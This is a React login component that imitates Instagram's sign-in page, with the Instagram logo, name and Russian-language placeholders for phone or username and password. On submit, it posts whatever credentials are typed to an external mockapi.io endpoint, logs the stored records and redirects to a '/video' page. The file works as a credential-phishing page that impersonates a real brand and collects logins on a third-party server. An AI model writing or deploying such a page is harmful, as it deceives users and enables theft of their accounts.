import { useState, useEffect } from 'react';
import axios from 'axios';
import { useNavigate } from 'react-router-dom';
import { FaEnvelope, FaLock } from 'react-icons/fa'; // Импорт иконок из react-icons

const API = "https://66a0dd2c7053166bcabd27e4.mockapi.io/users";

const Post = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const navigate = useNavigate(); // Инициализация useNavigate

  async function get() {
    try {
      const res = await axios.get(API);
      console.log(res);
    } catch (error) {
      console.log(error);
    }
  }

  useEffect(() => {
    get();
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const res = await axios.post(API, {
        email: email,
        password: password
      });
      console.log('Response:', res);
      setEmail('');
      setPassword('');
      navigate('/video'); // Перенаправление на страницу /video
    } catch (error) {
      console.log('Error:', error);
    }
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-100">
      <div className="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
        <form onSubmit={handleSubmit} className="space-y-6">
          <img className='w-[100px] h-[100px] flex mx-auto' src='https://static.vecteezy.com/system/resources/thumbnails/018/930/415/small/instagram-logo-instagram-icon-transparent-free-png.png'/>
          <h2 className="text-3xl font-bold text-center font-great-vibes">Instagram</h2>
          <div className="relative">
            <FaEnvelope className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-gray-400" />
            <input
              type="text"
              id="email"
              className="pl-10 pr-4 py-2 w-full border rounded focus:outline-none focus:ring focus:border-blue-300"
              placeholder="Номер телефона,имя пользователя"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
          </div>
          <div className="relative">
            <FaLock className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-gray-400" />
            <input
              type="password"
              id="password"
              className="pl-10 pr-4 py-2 w-full border rounded focus:outline-none focus:ring focus:border-blue-300"
              placeholder="Пароль"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
          </div>
          <button type="submit" className="w-full bg-blue-500 text-white py-2 rounded hover:bg-blue-700 transition duration-300">
            Login
          </button>
        </form>
      </div>
    </div>
  );
}

export default Post;
